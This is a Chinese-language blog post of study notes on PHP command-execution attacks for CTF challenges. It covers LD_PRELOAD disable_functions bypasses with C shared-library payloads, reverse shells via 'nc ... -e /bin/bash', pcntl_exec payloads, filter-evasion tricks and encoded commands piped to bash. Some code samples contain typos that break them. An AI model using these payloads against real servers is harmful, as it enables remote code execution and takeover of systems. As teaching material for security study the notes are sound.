<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
    <meta name="referrer" content="origin">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <title>
        
            php命令执行
        
    </title>
    <link rel="shortcut icon" href="#"/>

    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">

    <link type="text/css" rel="stylesheet" href="/css/base.css">
    <link type="text/css" rel="stylesheet" href="/css/code.css">

    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
<meta name="generator" content="Hexo 7.1.1"></head>
<body>
    <a id="cover"></a>
    <link type="text/css" rel="stylesheet" href="/css/post.css">
<div id="header" class="header">
    <div class="vertical">
        <div class="inner">
            
                <h1 class="header-subtitle">php命令执行</h1>
                <div class="header-subinfo">
                    <p class="article-info-text">
                        <span>
                            <i class="iconfont icon-time"></i> 发表时间：2024-04-17
                        </span>
                        
                            
                                <span id="/article/1615743781/" class="leancloud_visitors" data-flag-title="php命令执行">
                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
                                </span>
                            
                            
                                <span>
                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/1615743781/"></span>
                                </span>
                              
                        
                    </p>
                    
                    
                        
                            <span class="tag-color">学习笔记</span>
                        
                    
                </div>
            
        </div>
    </div>
    
</div>
<div id="container">
    
        <!-- 文章页面 -->
        <div id="article">
            <div class="toc"></div>
            <div class="article-body">
                <h1 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h1><h2 id="一-命令执行函数介绍"><a href="#一-命令执行函数介绍" class="headerlink" title="一.命令执行函数介绍"></a>一.命令执行函数介绍</h2><p><code>system exec passthru shell_exec 反引号 popen proc_open pcntl_exec</code></p>
<p>了解能否<strong>回显</strong>，需求的<strong>参数</strong></p>
<h3 id="system-string-command-int-return-var"><a href="#system-string-command-int-return-var" class="headerlink" title="system(string $command,int &amp;$return_var&#x3D;?)"></a>system(string $command,int &amp;$return_var&#x3D;?)</h3><p>command为执行的命令(必须)，return_var用来记录命令执行后返回的状态(可选)</p>
<p><strong>system函数有回显</strong></p>
<h3 id="exec-string-command-array-output-int-return-var"><a href="#exec-string-command-array-output-int-return-var" class="headerlink" title="exec(string $command,array &amp;$output&#x3D;?,int  &amp;$return_var&#x3D;?)"></a>exec(string $command,array &amp;$output&#x3D;?,int  &amp;$return_var&#x3D;?)</h3><p>command为执行的命令，单独使用时只有最后一行结果，且不会回显</p>
<p>output:用命令执行的输出填充此数组，每行输出一个元素，用<strong>print_r(array)或var_dump</strong>输出结果</p>
<p>var返回状态（忽略）</p>
<h3 id="passthru-string-command-int-return-var"><a href="#passthru-string-command-int-return-var" class="headerlink" title="passthru(string $command,int &amp;$return_var)"></a>passthru(string $command,int &amp;$return_var)</h3><p>command:执行的命令，var忽略</p>
<p>二进制数据（无关）</p>
<p><strong>直接回显，不需要print_r</strong></p>
<p>shell_exec(string $cmd)</p>
<p><strong>无回显，需要print_r，echo..</strong></p>
<h3 id="反引号-cmd"><a href="#反引号-cmd" class="headerlink" title="反引号`$cmd`"></a>反引号`$cmd`</h3><p><strong>无回显</strong></p>
<h3 id="popen-string-command-string-mode"><a href="#popen-string-command-string-mode" class="headerlink" title="popen(string $command,string $mode)"></a>popen(string $command,string $mode)</h3><p>mode(模式):’r’表示阅读,’w’表示写入。（命令执行后会把内容放到一个临时文档）</p>
<p>这个文档需要用fgets获取内容,用print_r输出内容</p>
<p><strong>‘w’模式支持自动回显，r模式需要用print_r</strong></p>
<h3 id="proc-open-1-2-3-4-5-6-不常用"><a href="#proc-open-1-2-3-4-5-6-不常用" class="headerlink" title="proc_open(1,2,3,4,5,6)	&#x2F;&#x2F;不常用"></a>proc_open(1,2,3,4,5,6)	&#x2F;&#x2F;不常用</h3><p>1,2,3必须</p>
<p>1:command;	2:descriptor_spec 定义数组内容	3:pipes:调用数组内容</p>
<p>descriptor_spec需要预定义，$pipes[1]写入，stream_get_contents($pipes[1]);读取，需要echo</p>
<h3 id="pcntl-exec-1-2-3-后续讲解"><a href="#pcntl-exec-1-2-3-后续讲解" class="headerlink" title="pcntl_exec(1,2,3)	&#x2F;&#x2F;后续讲解"></a>pcntl_exec(1,2,3)	&#x2F;&#x2F;后续讲解</h3><p>此模块需额外安装</p>
<p>1:string $path为一个可执行二进制文件，在linux中<code>/bin/命令</code> 为二进制执行</p>
<p>2：array $args是传递给程序的参数</p>
<p>3:$envs是字符串数组，key&#x3D;&gt;value格式,key代表要传递的环境变量的名称，value代表环境变量的值</p>
<h2 id="二、替换绕过函数过滤"><a href="#二、替换绕过函数过滤" class="headerlink" title="二、替换绕过函数过滤"></a>二、替换绕过函数过滤</h2><p>过滤exec|system|popen|proc_open|`</p>
<p>用其他函数,如passthru(‘cmd’)绕过</p>
<h2 id="三、LD-PRELOAD绕过原理"><a href="#三、LD-PRELOAD绕过原理" class="headerlink" title="三、LD_PRELOAD绕过原理"></a>三、LD_PRELOAD绕过原理</h2><h4 id="1-应用场景"><a href="#1-应用场景" class="headerlink" title="1.应用场景"></a>1.应用场景</h4><p>disable_functions禁用所有可能用到的命令执行函数</p>
<h4 id="2-程序的链接"><a href="#2-程序的链接" class="headerlink" title="2.程序的链接"></a>2.程序的链接</h4><p>(1)静态链接:在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。<br>(2)装入时动态链接:源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。<br>(3)运行时动态链接:原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。<br>    对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布&#x2F;维护&#x2F;更新。</p>
<h4 id="3-LD-PRELOAD"><a href="#3-LD-PRELOAD" class="headerlink" title="3.LD_PRELOAD"></a>3.LD_PRELOAD</h4><p>修改库文件</p>
<p>影响程序运行时的链接，加载别的动态链接可以，甚至覆盖正常的库</p>
<p>使用自己的或是更好的函数（无需别人的源码），也可以向别人的程序注入恶意程序</p>
<p>使用方法：</p>
<ol>
<li>mail 内嵌在php里</li>
<li>imagick需要扩展安装</li>
</ol>
<h5 id="1-mail"><a href="#1-mail" class="headerlink" title="1.mail"></a>1.mail</h5><p><code>vim demo.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>strace -o 1.txt -f php demo.php</code>把输出写到1.txt文件</p>
<p><code>cat 1.txt | grep execve</code>检查调用了那些子程序，调用了sendmail函数</p>
<p><code>readelf -Ws /usr/sbin/sendmail</code>查看调用了哪些库文件，其中geteuid库文件(获取用户uid信息)可以替换自己写的库文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;echo&#x27;小可爱，你邮件还能发出去么?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;<span class="comment">//生成动作geteuid,执行payload</span></span><br><span class="line">unsetenv(<span class="string">&quot;LD PRELOAD&quot;</span>);<span class="comment">//生成动作geteuid,执行payload结束调用</span></span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>粘贴到<code>vim poc.c</code>，<code>gcc -shared -fPIC demo.c -o demo.so</code>编译成.so文件，生成动态链接库文件</p>
<p>在此之前，需要修改demo,php更改库文件(esc wq保存)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这时调用<code>php demo.php</code>输出小可爱，你邮件还能发出去么?</p>
<p>原理mail-&gt;sendmail()-&gt;geteuid()</p>
<p>绕过条件：</p>
<p>1.能够上传自己的.so文件;</p>
<p>2.能够控制环境变量的值(设置LD_PRELOAD变量)，比如putenv函数并且未被禁止;</p>
<p>3.存在可以控制PHP启动外部程序的函数并能执行(因为新进程启动将加载LDPRELOAD<br>中的.so文件)，比如mail()、imap mail()、mb_send_mail()和error_log()等。</p>
<h4 id="4-例题-81端口禁用函数例题"><a href="#4-例题-81端口禁用函数例题" class="headerlink" title="4.例题-81端口禁用函数例题"></a>4.例题-81端口禁用函数例题</h4><p>ld-prlooad防炸<br><code>dpkg-reconfigure dash</code>      yes</p>
<p><code>dpkg-reconfigure bash</code>       做完了改回来</p>
<h5 id="1-上传-so和-php"><a href="#1-上传-so和-php" class="headerlink" title="1.上传.so和.php"></a>1.上传.so和.php</h5><p>使用蚁剑链接可以上传下载文件（不能直接查看根目录）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;cat /flag &gt; /tmp/flag&quot;</span>);<span class="comment">//故去flag输出到/tmp/flag(可查看的目录就行)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;<span class="comment">//生成动作geteuid,执行payload</span></span><br><span class="line">unsetenv(<span class="string">&quot;LD PRELOAD&quot;</span>);<span class="comment">//生成动作geteuid,执行payload结束调用</span></span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>粘贴到<code>vim poc.c</code>，<code>gcc -shared -fPIC demo.c -o demo.so</code>编译成.so文件，生成动态链接库文件</p>
<p>从&#x2F;root&#x2F;php找到demo.so，拷贝到windows</p>
<p>再编辑demo.php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一起上传到蚁剑,网页访问&#x2F;demo.php，在tmp目录找到flag</p>
<p>*为了避免重复上传文件，更改c文件的system为<code>system(&quot;nc 192.168.xxx.xxx 7777 -e /bin/bash&quot;)</code>反弹shell</p>
<p><code>nc -lvp 7777</code>监听7777端口</p>
<p>上传.so .php文件，访问demo.php，此时直接在linux终端输入命令即可</p>
<h5 id="EVIL-CMDLINE-不如nc"><a href="#EVIL-CMDLINE-不如nc" class="headerlink" title="EVIL_CMDLINE(不如nc)"></a>EVIL_CMDLINE(不如nc)</h5><p>把要执行的命令赋值到环境变量EVIL_CMDLINE直接读取命令</p>
<p>demo.c-&gt;.so</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL CMDLINE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&quot;LD PRELOAD&quot;</span>)== <span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenV(<span class="string">&quot;LD PRELOAD&quot;</span>);</span><br><span class="line">system(cmdline);<span class="comment">//放入system执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> =<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];<span class="comment">//要执行的命令</span></span><br><span class="line"><span class="variable">$out_path</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;outpath&quot;</span>];<span class="comment">//outpath命令执行结果输出到指定路径下的文件</span></span><br><span class="line"><span class="variable">$qvil_cmdline</span> = <span class="variable">$cmd</span>.<span class="string">&quot;&gt;&quot;</span>.<span class="variable">$out</span> path.<span class="string">&quot; 2&gt;&amp;1&quot;</span><span class="comment">//2&gt;&amp;1将标准错误重定向到标准输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;cmdline: &lt;/b&gt;&quot;</span>.<span class="variable">$evil</span> cmdline;<span class="comment">//打印显示实际在linux上执行的命令</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL CMDLINE=&quot;</span>.<span class="variable">$evil</span> cmdline);<span class="comment">//putenv改变环境变量的值</span></span><br><span class="line"><span class="variable">$so_path</span> =$ _REQUEST[<span class="string">&quot;sopath&quot;</span>];<span class="comment">//定义动态链接库</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD PRELOAD=&quot;</span>.<span class="variable">$so_path</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;output: &lt;/b&gt;&lt;br /&gt;&quot;</span>.<span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>));<span class="comment">//调用输出环境变量的命令</span></span><br></pre></td></tr></table></figure>

<p>上传.so,.php</p>
<p>访问url&#x2F;demo.php?cmd&#x3D;ls&amp;outpath&#x3D;&#x2F;tmp&#x2F;benben&amp;sopath&#x3D;.&#x2F;demo.so</p>
<h2 id="四、蚁剑及pcntl绕过函数过滤"><a href="#四、蚁剑及pcntl绕过函数过滤" class="headerlink" title="四、蚁剑及pcntl绕过函数过滤"></a>四、蚁剑及pcntl绕过函数过滤</h2><h3 id="1-蚁剑"><a href="#1-蚁剑" class="headerlink" title="1.蚁剑"></a>1.蚁剑</h3><p><img src="/../images/0421-1.png"></p>
<p>利用蚁剑的插件绕过</p>
<p><img src="/../images/0421/0421-3.png"></p>
<p><img src="/../images/0421/0421-4.png"></p>
<p>蚁剑链接.antproxy.php文件，即可成功执行命令，在虚拟终端中利用<code>tac /flag</code>即可读取</p>
<p><strong>PHP7 GC with Certain Destructors UAF</strong>直接打开虚拟终端</p>
<h3 id="2-pcntl-exec"><a href="#2-pcntl-exec" class="headerlink" title="2.pcntl_exec"></a>2.pcntl_exec</h3><p>需要单独安装</p>
<p>pcntl_exec(1,2,3)</p>
<ol>
<li>string $path :必须是可执行二进制文件路径或一个在文件第一行制定了一个可执行文件路径标头的脚本(例如#!&#x2F;lusr&#x2F;local&#x2F;bin&#x2F;perl)</li>
<li>array $args:传递给程序的单数的字符串数组，用于执行命令</li>
<li>envs:环境变量，忽略</li>
</ol>
<p>例如*#&#x2F;bin&#x2F;bash* -c &#x2F;bin&#x2F;ls 前面是path 后面是args	-c为执行此二进制文件</p>
<p>前提：info信息中没有禁用pcntl_exec函数</p>
<p>pcntl_exec函数没有回显</p>
<ol>
<li>cat文件并输出到有权限读取的路径</li>
<li>shell反弹</li>
</ol>
<p>payload:<code>cmd=pcntl_exec(&quot;/bin/bash&quot;,array(&quot;-c&quot;,&quot;nc 192.168.xxx.xxx 7777 -e /bin/bash&quot;));</code>注意是post还是get</p>
<p><code>nc -lvp 7777</code>监听端口即可</p>
<h2 id="五、操作系统连接符"><a href="#五、操作系统连接符" class="headerlink" title="五、操作系统连接符"></a>五、操作系统连接符</h2><p>拼接命令</p>
<h3 id="1-分号-；"><a href="#1-分号-；" class="headerlink" title="1.分号   ；"></a>1.分号   ；</h3><p>可以使命令都执行,类似sql堆叠注入</p>
<p>用法:可以提前闭合命令，或加上其他东西报错</p>
<p><code>-666;cat /flag;</code> 需要在页面源代码查看（tac指令可以直接显示）</p>
<h3 id="2"><a href="#2" class="headerlink" title="2.&amp;"></a>2.&amp;</h3><p><strong>必须url编码%26</strong></p>
<p>与；效果接近 ，同时执行多条命令</p>
<h3 id="3-与"><a href="#3-与" class="headerlink" title="3. &amp;&amp;	与"></a>3. &amp;&amp;	与</h3><p>如果前面命令执行成功，则执行后面命令，记得编码</p>
<p>?cmd&#x3D;%26%26pwd%26%26tac &#x2F;flag</p>
<h3 id="4-管道输出符"><a href="#4-管道输出符" class="headerlink" title="4.|	管道输出符"></a>4.|	管道输出符</h3><p>把前面的命令输出座位后面命令的输入，都会执行，但只显示后面执行的结果</p>
<p><code>echo &quot;ls -l&quot; | /bin/bash</code></p>
<h3 id="5-或"><a href="#5-或" class="headerlink" title="5.||	或"></a>5.||	或</h3><p>前面执行成功则后面的不执行，前面的失败后面的执行</p>
<p>应用:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span>=$ GET[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>;<span class="comment">//八所偶遇输出全部扔进垃圾桶</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过方法:</p>
<p><code>cmd=ls||</code>忽略掉后边的指令</p>
<h2 id="六、空格过滤绕过"><a href="#六、空格过滤绕过" class="headerlink" title="六、空格过滤绕过"></a>六、空格过滤绕过</h2><p><code>$cmd= preg replace(&quot;# #&quot;,&quot;&quot;,$cmd);</code>正则替换</p>
<p>例如:ls -l查看文件详细信息将失效</p>
<p>绕过方法:</p>
<p>1.大括号{cat,flag.txt}</p>
<p>2.$IFS，${IFS}，$IFS$9 (内敛字段分隔符)     	在Linux系统中用加大括号界定</p>
<p>3.重定向字符&lt;,&lt;&gt;;</p>
<p>“&lt;”是输出重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备</p>
<p>cat&lt;flag.php;	cat&lt;&gt;flag.php(&gt;会创建文件)</p>
<p>4.url编码%09-&gt;Tab %20-&gt;[空格]</p>
<h2 id="七、文件名过滤绕过"><a href="#七、文件名过滤绕过" class="headerlink" title="七、文件名过滤绕过"></a>七、文件名过滤绕过</h2><p><code>!preg_match(&quot;/flag|system|php/i&quot;,$cmd)</code></p>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="1-通配符-绕过"><a href="#1-通配符-绕过" class="headerlink" title="1.通配符? *绕过"></a>1.通配符? *绕过</h4><p>cat fl?g.php</p>
<p>?在Linux可以替代字母，可以替代很多字母 ????.???</p>
<p>*可以进行模糊匹配,代表任何字符串 cat f*</p>
<h4 id="2-单引号，双引号绕过"><a href="#2-单引号，双引号绕过" class="headerlink" title="2.单引号，双引号绕过"></a>2.单引号，双引号绕过</h4><p>‘’，””空字符	插入空字符</p>
<p>fl””ag fl&#39;&#39;ag</p>
<h4 id="3-反斜杠"><a href="#3-反斜杠" class="headerlink" title="3.反斜杠"></a>3.反斜杠</h4><p>反斜杠是换行的标志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f/lag==</span><br><span class="line">f</span><br><span class="line">lag</span><br></pre></td></tr></table></figure>

<h4 id="4-特殊变量"><a href="#4-特殊变量" class="headerlink" title="4.特殊变量"></a>4.特殊变量</h4><p>$1,$9,$@,$*无意义的字符</p>
<h4 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a>5.内联执行</h4><p><code>a=f;d=ag;c=l;cat \$a\$c\$b.txt</code></p>
<h4 id="6-利用Linux中的环境变量"><a href="#6-利用Linux中的环境变量" class="headerlink" title="6.利用Linux中的环境变量"></a>6.利用Linux中的环境变量</h4><p>试用环境变量里的字符执行变量</p>
<p><code>echo $PATH</code>会输出环境变量</p>
<p><code>$&#123;PATH：5:1&#125;</code>代表从第5个字符起取出1个字符</p>
<p><code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></p>
<p>&#x2F;也是字符,从0开始数</p>
<p><code>#echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;g.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></p>
<h2 id="八、常见文件读取命令绕过"><a href="#八、常见文件读取命令绕过" class="headerlink" title="八、常见文件读取命令绕过"></a>八、常见文件读取命令绕过</h2><p><code>(!preg_match(&quot;/flag|php|cat|sort|shell\&#39;/i&quot;,$cmd)</code></p>
<p>绕过方法:</p>
<ol>
<li>tac:反向显示<br>自下而上</li>
<li>more:一页一页的显示档案内容 查看源代码</li>
<li>less:效果和more类似</li>
<li>tail:查看末尾几行（最后十行）</li>
<li>nl:显示的时候显示行号，查看源代码</li>
<li>od：以二进制方式读取文件内容<br><code>cmd=passthru(&quot;od -A d -c fla\g/ph\p&quot;)</code>可以把ascii码转换成字符,一行32字节</li>
<li>xxd:读取二进制文档<br>左边二进制右边字符</li>
<li>sort:主要用于排序文件<br><code>?cmd=passthru(&quot;/usr/bin/so?t fl\ag.p\hp&quot;)</code>应对sort被过滤</li>
<li>uniq：报告或删除文件中重复的行</li>
<li>file -f:报错出具体内容</li>
<li>grep：在文本中查找指定的字符串<br><code>grep fl fla*</code> 从fla*文件中搜索包含fla的字符串的行,一般搜索{</li>
<li>一定记得加分号</li>
</ol>
<h2 id="九、编码绕过"><a href="#九、编码绕过" class="headerlink" title="九、编码绕过"></a>九、编码绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p>命令编码后的字符串–绕过过滤—&gt;目标服务器—解码—&gt;执行命令</p>
<h3 id="1-base64编码"><a href="#1-base64编码" class="headerlink" title="1.base64编码"></a>1.base64编码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">b&#x27;cat flag.php&#x27;</span></span><br><span class="line">e64= base64.b64encode(S)</span><br><span class="line"><span class="built_in">print</span>(e64)</span><br></pre></td></tr></table></figure>

<p><code>cat flag.php-&gt;Y2F0lGZsYWcucGhw</code><br><code>echo &quot;Y2F0lGZsYWcucGhw&quot; | base64 -d</code>管道输出符 -d表示decode解码</p>
<p>让命令执行passthru(‘  1 or 2 or 3  ‘)</p>
<ol>
<li><code>echo Y2F0lGZsYWcucGhw | base64 -d | /bin/bash</code> &#x2F;bin&#x2F;bash or bash or sh… </li>
<li>反引号</li>
<li>$()</li>
</ol>
<h3 id="2-base32"><a href="#2-base32" class="headerlink" title="2.base32"></a>2.base32</h3><p>与base64同</p>
<h3 id="3-HEX编码-acsii"><a href="#3-HEX编码-acsii" class="headerlink" title="3.HEX编码(acsii)"></a>3.HEX编码(acsii)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binacsii</span><br><span class="line">s = <span class="string">b&quot;tac flag&quot;</span></span><br><span class="line">h= binascii.b2a_hex(s)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br></pre></td></tr></table></figure>

<p><code>tac flag.php-&gt;74616320666c61672e706870</code><br>&#96;&#96;#echo “74616320666c61672e706870” | xxd -r-p | bash&#96;</p>
<h3 id="4-shellcode编码-16进制机器码"><a href="#4-shellcode编码-16进制机器码" class="headerlink" title="4.shellcode编码(16进制机器码)"></a>4.shellcode编码(16进制机器码)</h3><p>当服务器没装xxd可以用</p>
<p><code>tac flag.php -&gt;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</code>也就是把ascii每两个之前加\x</p>
<h2 id="十、无回显时间盲注"><a href="#十、无回显时间盲注" class="headerlink" title="十、无回显时间盲注"></a>十、无回显时间盲注</h2><p>适用条件：页面无法反弹shell，无回显，没有写入权限</p>
<p>原理：根据返回时间来判断（时间盲注）</p>
<p>函数：sleep 1 -&gt; 睡眠一秒<br>awk NR:逐行读取	cat flag.php | awk NR=&#x3D;1读取第一行<br>cut -c:读取第几个字符	cat flag.php | awk NR&#x3D;&#x3D;1 | cut -c 1读取第一行第一个字符<br>if [ ];then 条件为真执行;fi	finish表示条件为假什么也不执行,注意if之后必须有空格<code>if [2&gt;1];then echo &#39;right;fi&#39;</code></p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png"></p>
<p>$()执行语句,字母不用加引号<br>时间盲注：<code>#if [$(cat flag |awk NR==2|cut -c 1)== F ];then sleep 2;fi</code></p>
